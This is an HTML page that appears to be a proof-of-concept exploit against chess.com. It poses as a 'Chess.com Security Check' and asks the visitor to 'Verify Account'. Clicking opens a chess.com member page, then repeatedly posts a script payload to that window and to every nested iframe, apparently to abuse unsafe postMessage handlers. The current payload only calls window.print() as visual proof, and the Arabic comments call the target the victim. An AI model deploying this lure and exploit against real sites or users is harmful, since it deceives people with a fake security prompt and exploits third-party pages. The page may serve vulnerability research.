<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f4;}
        button { padding: 15px 30px; font-size: 20px; background-color: #3182ce; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #2b6cb0; }
    </style>
</head>
<body>
    <h1>Chess.com Security Check</h1>
    <p>Please click the button below to verify your account session.</p>
    
    <button onclick="startAttack()">Verify Account</button>

    <script>
        // Payload الإثبات البصري (نافذة الطباعة)
        let payload = "window.print(); // get_ext";
        let spammer;

        // دالة الضرب العنقودي (Recursion)
        function blastFrames(win) {
            try {
                win.postMessage(payload, "*");
            } catch(e) {}
            
            try {
                // الدخول للـ Iframes اللي جوه النافذة الجديدة
                for (let i = 0; i < win.frames.length; i++) {
                    blastFrames(win.frames[i]);
                }
            } catch(e) {}
        }

        // دالة الهجوم اللي بتشتغل لما الضحية يدوس على الزرار
        function startAttack() {
            // 1. فتح الموقع في نافذة جديدة أو تاب جديدة
            let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victimWindow");

            // 2. نستنى 3 ثواني لحد ما الموقع يحمل إعلاناته
            setTimeout(() => {
                console.log("Starting the blast...");
                
                // 3. نضرب النافذة الجديدة كل 10 ملي ثانية
                spammer = setInterval(() => {
                    if(victimWin) {
                        blastFrames(victimWin);
                    }
                }, 10);

                // 4. نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
                setTimeout(() => {
                    clearInterval(spammer);
                    console.log("Blasting finished.");
                }, 10000);

            }, 3000);
        }
    </script>
</body>
</html>
